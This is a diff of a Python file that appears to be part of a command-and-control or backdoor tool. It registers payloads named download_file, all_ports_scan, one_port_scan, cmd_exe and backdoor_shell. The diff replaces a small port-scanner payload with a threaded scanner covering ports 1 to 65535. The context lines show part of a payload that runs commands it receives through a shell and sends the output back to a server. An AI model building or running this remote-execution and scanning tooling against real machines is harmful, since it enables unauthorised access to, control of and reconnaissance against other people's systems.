@@ -59,33 +59,48 @@ with socket.socket() as soc:
             process = subprocess.run(command, shell=True ,stdout=subprocess.PIPE, stderr=subprocess.PIPE) #run command on shell
             client.send(process.stdout) #send stdout to server"""
 
-## took ports_payload from https://github.com/Metallicode/pythonCourse3.6.5/
-ports_payload = """
+
+all_ports_payload = """import sys
 import socket
+from datetime import datetime
 import threading
-import sys
+  
+if len(sys.argv) == 2:
+    target_ip = socket.gethostbyname(sys.argv[1])
+else:
+    print("Invalid amount of Argument")
+ 
 
-results ={}
+print("-" * 50)
+print("Scanning Target: " + target_ip)
+print("Scanning started at:" + str(datetime.now()))
+print("-" * 50)
+  
 
-#thread worker
-def worker(port, ip):
-      soc = socket.socket()
-      soc.settimeout(0.5)
-      if soc.connect_ex((ip, port))==0:
-            results[port]=soc.recv(84).decode()
-      soc.close()
+def check_open(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket.setdefaulttimeout(1)
+        
+    # returns an error indicator
+    result = s.connect_ex((target_ip,port))
+    if result ==0:
+        print("Port {} is open".format(port))
+    s.close()
+         
+try:
+    # will scan ports between 1 to 65,535
+    for port in range(1,65535):
+        t  = threading.Thread(target=check_open, args=(port,))
+        t.start()
+         
+except socket.gaierror:
+        print("Hostname Could Not Be Resolved !!!!")
+        sys.exit()
+except socket.error:
+        print("\ Server not responding !!!!")
+        sys.exit()
 
-
-ip = sys.argv[1]
-
-#run on 0-999 for port numbers
-for i in range(1000):
-      t = threading.Thread(target=worker, args=(i, ip))
-      t.start()
-
-
-for key in results:
-    print(f"port {key}\t\t {results[key]}")"""
+"""
 
 ##############################################################
 
@@ -100,17 +115,13 @@ bs_args     = ["enter port to take control over client's shell:"]
 
 
 
-download_file   = command(payload=d_payload, type='download_text_file', args_to_ask=d_args)
-ports_scan      = command(payload=ports_payload, type='ports_scan', args_to_ask=[])
+download_file   = command(payload=d_payload, type='download_file', args_to_ask=d_args)
+all_ports_scan  = command(payload=all_ports_payload, type='all_ports_scan', args_to_ask=[])
 one_port_scan   = command(payload=p_payload, type='one_port_scan', args_to_ask=p_args)
 cmd_exe         = command(payload=ce_payload, type='cmd_exe', args_to_ask=ce_args)
 backdoor_shell  = command(payload=backdoor_payload, type='take_shell', args_to_ask=bs_args)
 
-commands_list  = [download_file, one_port_scan, cmd_exe, backdoor_shell]
-
-
-
-
+commands_list  = [download_file, all_ports_scan, one_port_scan, cmd_exe, backdoor_shell]
 
 
 
